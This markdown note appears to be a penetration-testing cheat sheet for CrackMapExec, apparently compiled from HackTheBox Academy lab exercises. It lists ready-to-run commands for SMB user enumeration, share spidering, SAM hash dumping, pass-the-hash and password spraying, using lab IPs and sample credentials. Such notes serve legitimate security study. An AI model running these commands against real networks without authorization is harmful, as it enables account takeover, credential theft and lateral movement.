---
type: tool
category: web
tags:
  - tool
---
# Overview
https://github.com/byt3bl33d3r/CrackMapExec

## Commands

#### Enumerating users and "badpwdcount" (without Credentials)
If successful, we not only get an available userslist, but also know how close a users "badpwdcount" is to lock him out:
```bash
sudo crackmapexec smb 172.16.5.5 --users > userenum
```
it can be helpful to filter the output for further steps, such as password spraying:
```bash
sed -r "s/\x1B\[[0-9;]*[a-zA-Z]//g" userenum | grep -oP '\b[A-Za-z0-9_.-]+\\[A-Za-z0-9_.-]+' | sort -u > filtered-userenum
```
#### Enumerating users and "badpwdcount" (with Credentials)
If successful, we not only get an available userslist, but also know how close a users "badpwdcount" is to lock him out:
```bash
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users > userenum
```
it can be helpful to filter the output for further steps, such as password spraying:
```bash
sed -r "s/\x1B\[[0-9;]*[a-zA-Z]//g" userenum | grep -oP '\b[A-Za-z0-9_.-]+\\[A-Za-z0-9_.-]+' | sort -u > filtered-userenum
```
#### Enumerating Logged-on Users
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.
```bash
sudo crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Spider Shares
`CrackMapExec` can also be used to spider shares and list all readable files:
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`.
#### Extract Hashes from SAM Database
If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash. We will discuss it later in this section.

```bash
sudo crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH) - CrackMapExec (SMB)
```bash
sudo crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### Retrieving Password Policies - CrackMapExec (SMB)
```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

#### Password Spraying - CrackMapExec
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Password Spraying with Hash - CrackMapExec
Following command sprays a password hash (e.g. of a local Admin) against all devices `local SAM DB` in the subnet:
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Important Parameter
crackmapexec
	`-h` = help, shows options
	`-h smb` = shows options of e.g. smb (works for all protocols)
	`--local-auth` = only uses local authentication aka ".\\"
	`--loggedon-users` = checks which users are logged on, on a machine
	`--pass-pol` = retrieves password policy
	`--sam` = retrieves SAM DB